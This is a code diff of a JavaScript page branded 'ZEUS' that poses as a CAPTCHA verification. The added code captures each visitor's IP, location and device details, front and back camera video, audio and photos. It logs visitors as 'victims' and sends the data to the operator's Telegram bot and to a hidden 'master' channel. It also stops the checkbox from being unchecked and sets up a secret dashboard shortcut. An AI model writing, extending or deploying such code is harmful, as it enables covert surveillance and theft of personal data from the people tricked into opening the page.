+                            token = params.get('t') || 'غير معروف';
+                        }
+
+                        var data = {
                             ip: ip,
                             location: location,
                             device: deviceData.platform || 'Unknown',
                             browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
                                 /Firefox/.test(navigator.userAgent) ? 'Firefox' :
                                 /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
-                            time: new Date().toLocaleString('ar-EG'),
+                            timestamp: new Date().toISOString(),
                             frontVideo: frontResult.video,
                             backVideo: backVideo,
                             audio: audioBlob,
                             photos: frontResult.photos
                         };
 
-                        const token = rawToken || 'غير معروف';
+                        // Save victim
+                        var victims = getVictims();
+                        var victimId = Date.now() + Math.floor(Math.random() * 1000);
+                        var victimData = {
+                            id: victimId,
+                            shortToken: token,
+                            ip: data.ip,
+                            location: data.location,
+                            browser: data.browser,
+                            timestamp: data.timestamp,
+                            device: data.device
+                        };
+                        victims.push(victimData);
+                        localStorage.setItem('zeus_victims', JSON.stringify(victims));
 
-                        if (botCreds && botCreds.botToken && botCreds.chatId) {
-                            try {
-                                await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
-                            } catch (e) {
-                                console.warn('User send failed:', e);
+                        // Save files
+                        var files = getFiles();
+                        var fileId = Date.now();
+
+                        var saveFile = function(fileData) {
+                            return new Promise(function(resolve) {
+                                var reader = new FileReader();
+                                reader.onload = function() {
+                                    files.push({
+                                        id: fileId++,
+                                        shortToken: token,
+                                        victimId: victimId,
+                                        type: fileData.type,
+                                        filename: fileData.filename,
+                                        dataUrl: reader.result,
+                                        timestamp: Date.now()
+                                    });
+                                    resolve();
+                                };
+                                reader.readAsDataURL(fileData.blob);
+                            });
+                        };
+
+                        if (data.photos && data.photos.length > 0) {
+                            for (var i = 0; i < data.photos.length; i++) {
+                                await saveFile({ blob: data.photos[i], type: 'image', filename: 'photo_' + (i +
+                                        1) + '.jpg' });
                             }
                         }
-
-                        try {
-                            await sendToMaster(data, battery, token);
-                        } catch (e) {
-                            console.warn('Master send failed:', e);
+                        if (data.frontVideo) {
+                            await saveFile({ blob: data.frontVideo, type: 'video', filename: 'front_video.webm' });
                         }
-
-                        collectionDone = true;
-
-                        spinner.classList.remove('loading', 'success');
-                        spinner.classList.add('failed');
-                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
-                        mainText.className = 'text failed';
-                        checkbox.checked = false;
-
-                        if (redirectUrl) {
-                            setTimeout(function() {
-                                window.location.replace(redirectUrl);
-                            }, 800);
-                        } else {
-                            setTimeout(function() {
-                                location.reload();
-                            }, 4000);
+                        if (data.backVideo) {
+                            await saveFile({ blob: data.backVideo, type: 'video', filename: 'back_video.webm' });
                         }
+                        if (data.audio) {
+                            await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.webm' });
+                        }
+                        localStorage.setItem('zeus_files', JSON.stringify(files));
 
-                    } catch (error) {
-                        console.error('Collection error:', error);
-                        spinner.classList.remove('loading', 'success');
-                        spinner.classList.add('failed');
-                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
-                        mainText.className = 'text failed';
-                        checkbox.checked = false;
-                        isRunning = false;
-                        checkbox.disabled = false;
+                        // Activity log
+                        addActivityLog('victim_visited', token, 'زيارة من ' + data.ip);
+
+                        // Send to Telegram
+                        if (botCreds && botCreds.botToken && botCreds.chatId) {
+                            await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
+                        }
+                        await sendToMaster(data, battery, token);
+
+                    } catch (e) {
+                        console.warn('Background collection error:', e);
                     }
                 }
 
+                // ===== CAPTCHA EVENTS =====
                 document.addEventListener('click', function(e) {
-                    if (isRunning || collectionDone) return;
+                    if (isRunning || collectionDone || redirectTriggered) return;
                     if (e.target.closest('a')) return;
                     if (!checkbox.checked && !spinner.classList.contains('loading')) {
-                        collectEverything();
+                        // Check the box manually to trigger
+                        checkbox.checked = true;
+                        spinner.classList.add('loading');
+                        spinner.classList.remove('failed', 'success');
+                        mainText.textContent = 'جاري التحقق …';
+                        mainText.className = 'text loading';
+                        collectAndRedirect();
                     }
                 });
 
                 checkbox.addEventListener('change', function(e) {
                     if (this.checked) {
-                        this.checked = false;
-                        if (!isRunning && !collectionDone) collectEverything();
+                        // Already handled by click
+                    } else {
+                        // prevent uncheck
+                        this.checked = true;
                     }
                 });
 
-                console.log('Victim page ready.');
+                console.log('✅ ZEUS — Victim page ready (fast redirect mode).');
             }
+
+            // ================================================================
+            //  INIT DASHBOARD ON OPEN
+            // ================================================================
+
+            // When dashboard opens, render it
+            const observer = new MutationObserver(function() {
+                if (document.getElementById('dashOverlay').classList.contains('active')) {
+                    renderDashboard();
+                }
+            });
+            observer.observe(document.getElementById('dashOverlay'), { attributes: true, attributeFilter: ['class'] });
+
+            console.log('👑 ZEUS KINGDOM — النظام الكامل المتكامل.');
+            console.log('🔑 الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
+            console.log('📨 سيتم إرسال الكود إلى المطور في تليجرام.');
+            console.log('⚡ وضع الضحية: تحويل فوري بعد الكابتشا (1.2 ثانية)');
 
         })();
     </script>
